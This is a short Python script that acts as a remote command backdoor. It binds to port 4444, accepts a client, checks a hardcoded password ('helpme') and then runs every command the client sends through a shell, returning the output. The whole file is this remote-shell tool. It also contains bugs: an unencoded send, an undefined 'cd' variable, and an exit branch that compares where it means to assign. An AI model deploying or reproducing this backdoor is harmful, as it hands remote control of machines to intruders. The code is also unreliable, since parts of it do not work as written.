import socket
import subprocess
import os


def lookForConnection(server):
    print('Server Started')
    print('Listening For Client Connection')
    server.listen(1)
    client, client_addr = server.accept()
    password = client.recv(1024)
    password = password.decode()
    return password, client, client_addr

def checkPass(password, client, client_addr):
    valid = False
    if password == real_password:
        valid = True
        print(str(client_addr) + " has connected to the server")
        client.send(("Connected!"))
    else:
        valid = False
        client.send(("Incorrect Password...Closing Connection").encode())
        client.close()
    return valid

HOSTNAME = socket.gethostname()
HOST = socket.gethostbyname(HOSTNAME)
PORT = 4444
real_password = "helpme"
passwords_match = False
server = socket.socket()
server.bind((HOST, PORT))
password, client, client_addr = lookForConnection(server)
passwords_match = checkPass(password, client, client_addr)
print(passwords_match)

while passwords_match == False:
    password, client, client_addr = lookForConnection(server)
    passwords_match = checkPass(password, client, client_addr)

while passwords_match == True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    if command == "exit":
        passwords_match == False
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        client.send(("Disconnecting").encode())
        client.close()
        password, client, client_addr = lookForConnection(server)
        passwords_match = checkPass(password, client, client_addr)
        print(passwords_match)
    elif command[:2] == "cd" or command[:5] == "chdir":
        if command[:2] == "cd":
            try:
                os.chdir(cd[3:])
            except OSError:
                print("cd did not work")
        else:
            try:
                os.chdir(cd[6:])
            except OSError:
                print("cd did not work")
    else:
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        print("[-] Sending response...")
        client.send(output + output_error)
